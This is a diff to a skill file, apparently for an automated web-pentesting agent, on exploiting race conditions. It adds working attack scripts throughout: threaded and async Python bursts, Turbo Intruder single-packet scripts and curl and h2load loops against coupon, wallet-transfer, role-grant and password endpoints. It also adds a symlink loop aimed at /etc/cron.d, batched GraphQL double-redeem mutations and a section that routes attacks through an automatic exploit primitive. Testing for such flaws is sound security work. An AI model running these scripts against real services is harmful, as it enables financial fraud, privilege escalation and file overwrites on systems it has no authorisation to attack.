@@ -1,9 +1,10 @@
-﻿---
+---
 name: race-conditions-advanced
 description: "Advanced race condition exploitation using Turbowlence, single-packet attacks, and TOCTOU chains"
 category: specialized
 tier: powerful
-toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
+toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive]
+primitives: [concurrencyHarness]
 triggers: ["race condition", "concurrent request", "turbowlence", "single packet attack", "toctou", "time of check", "double spend", "race condition exploit", "parallel request", "thread safety"]
 contextBoosts: [api]
 mitreAttack: ["T1190", "T1499"]
@@ -45,6 +46,13 @@ owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
 
 A TOCTOU vulnerability exists when the application performs a check (is this coupon valid?) and then acts on the result (redeem the coupon) as two separate, non-atomic operations. The vulnerability is the gap between the check and the use.
 
+```
+Thread A:  [CHECK coupon.valid == true] ────────> [ACT: coupon.used = true]
+Thread B:      [CHECK coupon.valid == true] ──────────> [ACT: coupon.used = true]
+                ^ both checks read the same pre-commit state
+```
+
+**Critical principle**: The exploit is not about speed — it is about ensuring two requests observe the same precondition before either commits the effect.
 
 **Critical principle**: The exploit is not about speed — it is about ensuring two requests observe the same precondition before either commits the effect.
 
@@ -89,6 +97,34 @@ An operation is atomic if it completes entirely or not at all, with no observabl
 
 Use scripting to spawn N threads, each issuing an identical HTTP request. The goal is to overwhelm the application's sequential processing assumption.
 
+```python
+import threading
+import requests
+
+TARGET = "https://target.com/api/redeem"
+COOKIES = {"session": "<valid-session-token>"}
+BODY = {"coupon": "SAVE50", "order_id": 1001}
+concurrency = 30
+
+results = []
+barrier = threading.Barrier(concurrency)
+
+def fire():
+    s = requests.Session()
+    s.cookies.update(COOKIES)
+    barrier.wait()                      # all threads release simultaneously
+    r = s.post(TARGET, json=BODY)
+    results.append((r.status_code, r.text[:120]))
+
+threads = [threading.Thread(target=fire) for _ in range(concurrency)]
+for t in threads: t.start()
+for t in threads: t.join()
+
+successes = [r for r in results if r[0] == 200]
+print(f"Applied {len(successes)} times — >1 means race condition confirmed")
+```
+
+**Key parameters**:
 
 **Key parameters**:
 - `concurrency`: Start with 10, scale to 50-100 if needed
@@ -98,6 +134,32 @@ Use scripting to spawn N threads, each issuing an identical HTTP request. The go
 ### Async Request Batching
 
 When true parallelism is unavailable, use asynchronous request batching with minimal stagger:
+
+```python
+import asyncio
+import aiohttp
+
+TARGET = "https://target.com/api/redeem"
+HEADERS = {"Cookie": "session=<token>", "Content-Type": "application/json"}
+BODY = b'{"coupon": "SAVE50", "order_id": 1001}'
+
+async def fire(session, gate):
+    async with gate:
+        return await session.post(TARGET, headers=HEADERS, data=BODY)
+
+async def main(n=30):
+    gate = asyncio.Lock()
+    async with aiohttp.ClientSession() as s:
+        # hold the lock so all coroutines queue up, then release in one tick
+        await gate.acquire()
+        tasks = [asyncio.create_task(fire(s, gate)) for _ in range(n)]
+        gate.release()
+        for t in tasks:
+            r = await t
+            print(r.status, (await r.text())[:80])
+
+asyncio.run(main())
+```
 
 1. Queue N requests
 2. Dispatch all within a single event loop tick (JavaScript) or thread pool burst (Python/Java)
@@ -129,6 +191,40 @@ Turbowlence (or Turboslacker-style techniques) refers to sending N concurrent HT
 
 ### Configuration
 
+Turbo Intruder script (last-write-wins / double-redeem):
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    req = '''POST /api/redeem HTTP/2
+Host: %s
+Cookie: session=<valid-session-token>
+Content-Type: application/json
+
+{"coupon": "SAVE50", "order_id": 1001}
+''' % target.host
+
+    # queue 30 identical requests, hold them, then release in one burst
+    for i in range(30):
+        engine.queue(req, gate='race1')
+    engine.openGate('race1')            # releases all queued requests simultaneously
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+```bash
+# curl parallel equivalent (approximate — separate connections, less precise)
+for i in $(seq 1 30); do
+  curl -sk -o /dev/null -w "%{http_code}\n" https://target.com/api/redeem \
+    -H "Cookie: session=<token>" -H "Content-Type: application/json" \
+    -d '{"coupon":"SAVE50","order_id":1001}' &
+done; wait
+```
 
 ### Interpreting Results
 
@@ -152,6 +248,39 @@ The single-packet attack is an advanced technique that embeds multiple HTTP requ
 
 ### Crafting the Packet
 
+Turbo Intruder with `engine.request(...)`, HTTP/2, and a single connection achieves near-single-packet overlap:
+
+```python
+def queueRequests(target, wordlists):
+    # HTTP/2 single-connection: all streams are written into the same TCP flight
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,   # ONE connection
+                           engine=Engine.THREADED,
+                           http2=True)
+
+    req_victim   = '''POST /api/apply-coupon HTTP/2
+Host: %s
+Cookie: session=<token>
+Content-Type: application/json
+
+{"coupon": "SAVE50"}
+''' % target.host
+
+    for i in range(20):
+        engine.queue(req_victim, gate='single')
+    engine.openGate('single')          # all 20 HEADERS+DATA frames hit the wire together
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+```bash
+# h2load / nghttp alternative — N concurrent streams over one connection
+h2load -n 30 -c 1 -m 30 \
+  -H "Cookie: session=<token>" \
+  -d @coupon-body.json \
+  https://target.com/api/apply-coupon
+```
 
 ### Requirements
 
@@ -198,6 +327,25 @@ The classic double-spend race:
 
 Look for this code pattern in application logic (or infer from behavior):
 
+```javascript
+// VULNERABLE: check and act are separate, non-atomic statements
+app.post('/api/transfer', async (req, res) => {
+  const account = await db.getAccount(req.user.id);
+  if (account.balance < req.body.amount) {           // 1. CHECK
+    return res.status(400).json({error: 'insufficient funds'});
+  }
+  account.balance -= req.body.amount;                // 2. ACT (no lock, no tx)
+  await account.save();
+  res.json({ok: true});
+});
+```
+
+```sql
+-- Atomic alternative the app SHOULD have used:
+UPDATE accounts SET balance = balance - :amount
+WHERE id = :user_id AND balance >= :amount;
+-- rowcount = 0 → insufficient funds; race eliminated at the DB level
+```
 
 If steps 1-3 are not within a single atomic transaction, the race window exists.
 
@@ -218,6 +366,28 @@ A double-spend occurs when a single unit of value (currency, credit, token, coup
 
 ### Exploitation Patterns
 
+```python
+# Wallet double-spend: two concurrent full-balance transfers to different recipients
+import threading, requests
+
+S = requests.Session()
+S.headers["Cookie"] = "session=<token>"
+
+def transfer(to, amount):
+    return S.post("https://target.com/api/transfer",
+                  json={"to": to, "amount": amount}).status_code
+
+barrier = threading.Barrier(2)
+def race(to):
+    barrier.wait()
+    print(to, transfer(to, 1000))
+
+t1 = threading.Thread(target=race, args=("attacker1",))
+t2 = threading.Thread(target=race, args=("attacker2",))
+t1.start(); t2.start(); t1.join(); t2.join()
+# Both 200 → balance went negative → double-spend confirmed
+```
+
 - **Wallet transfer**: Send the same balance to two different recipients concurrently
 - **Coupon redemption**: Apply the same coupon to two orders concurrently
 - **Token consumption**: Use the same API token for two concurrent operations that each invalidate it
@@ -235,6 +405,24 @@ A double-spend occurs when a single unit of value (currency, credit, token, coup
 
 ### Concurrent Admin Grant
 
+```python
+# Two concurrent promotions against a "only one admin allowed" check
+import threading, requests
+
+S = requests.Session()
+S.headers["Cookie"] = "session=<admin-token>"
+barrier = threading.Barrier(2)
+
+def promote(user_id):
+    barrier.wait()
+    r = S.post("https://target.com/api/roles", json={"user": user_id, "role": "admin"})
+    print(user_id, r.status_code)
+
+threading.Thread(target=promote, args=(1001,)).start()
+threading.Thread(target=promote, args=(1002,)).start()
+# Both succeed → two admins exist despite the single-admin invariant
+```
+
 1. Send two concurrent requests: one to promote User A to admin, one to promote User B to admin
 2. If the application checks "is there already an admin?" before each grant, both may pass
 3. Result: two admins when only one was intended
@@ -248,6 +436,25 @@ A double-spend occurs when a single unit of value (currency, credit, token, coup
 
 ### Session Token Race
 
+```python
+# Two concurrent password changes → both responses contain valid new tokens
+import threading, requests
+
+S = requests.Session()
+S.headers["Cookie"] = "session=<current-token>"
+tokens = []
+barrier = threading.Barrier(2)
+
+def change_password():
+    barrier.wait()
+    r = S.post("https://target.com/api/password", json={"new": "Passw0rd!race"})
+    tokens.append(r.json().get("token"))
+
+threading.Thread(target=change_password).start()
+threading.Thread(target=change_password).start()
+print(tokens)   # 2 distinct live tokens after "logout everywhere" semantics should have killed one
+```
+
 1. Application invalidates old token and issues new token during password change
 2. Send two concurrent password-change requests
 3. Both receive valid new tokens before either invalidation completes
@@ -258,6 +465,16 @@ A double-spend occurs when a single unit of value (currency, credit, token, coup
 ## File System Races
 
 ### Symlink Attacks
+
+```bash
+# Predictable temp file: app writes to /tmp/report_<timestamp>.pdf
+# Attacker pre-creates a symlink so the write lands elsewhere:
+ln -s /etc/cron.d/pwn /tmp/report_1755850000.pdf
+# Loop to win the window between check and open:
+while true; do
+  ln -sf /etc/cron.d/pwn "/tmp/report_$(date +%s).pdf" 2>/dev/null
+done
+```
 
 1. Application creates a temporary file in a shared directory with a predictable name
 2. Attacker places a symlink at that path before the application opens it
@@ -284,6 +501,24 @@ A double-spend occurs when a single unit of value (currency, credit, token, coup
 
 GraphQL allows multiple mutations in a single request. If the server processes them concurrently:
 
+```graphql
+mutation DoubleRedeem {
+  a: redeemCoupon(code: "SAVE50", orderId: 1001) { success newBalance }
+  b: redeemCoupon(code: "SAVE50", orderId: 1002) { success newBalance }
+}
+```
+
+```http
+POST /graphql HTTP/1.1
+Host: target.com
+Cookie: session=<token>
+Content-Type: application/json
+
+{"query": "mutation($o1:Int!,$o2:Int!){a:redeemCoupon(code:\"SAVE50\",orderId:$o1){success}b:redeemCoupon(code:\"SAVE50\",orderId:$o2){success}}",
+ "variables": {"o1": 1001, "o2": 1002}}
+```
+
+Both mutations may read the same balance before either commits. Test by sending batched mutations that affect the same resource.
 
 Both mutations may read the same balance before either commits. Test by sending batched mutations that affect the same resource.
 
@@ -295,6 +530,14 @@ Both mutations may read the same balance before either commits. Test by sending 
 4. Race between subscription event delivery and mutation commit can cause UI inconsistencies or data loss
 
 ### Batched Query Exploitation
+
+```graphql
+# Read-then-write in one batch: the read may return pre-commit state
+query Race {
+  balance: getBalance(accountId: 42)
+  spend: spendBalance(accountId: 42, amount: 1000) { ok }
+}
+```
 
 1. Send a batched query where one query reads a value and another writes to it
 2. If the server executes the batch without serializing mutations, the read may return stale data
@@ -348,3 +591,14 @@ First enumerate every POST/PUT/PATCH/DELETE that mutates state and trace whether
 ## Verification & Impact
 
 CONFIRMED when concurrent requests produce duplicated or inconsistent server state: two transactions with distinct IDs, negative balance after two full-balance transfers, or the same single-use coupon applied twice. SUSPECTED when responses diverge but state impact is unverified — record as candidate. Document impact by the resource abused (funds, coupons, inventory, privileges, sessions) and severity. Capture the full concurrent request set, timing, and resulting state via `recordEvidence`.
+
+## Primitive Execution
+
+The attack classes above are executable through the primitive registry. Invoke each
+primitive by its id below using the run-primitive execution tool instead of re-firing
+payloads manually; confirmed results pass through the evidence gate and commit as
+findings with exploit proofs automatically.
+
+| Primitive id | Coverage |
+|---|---|
+| `concurrencyHarness` | parallel race burst with divergence oracle |
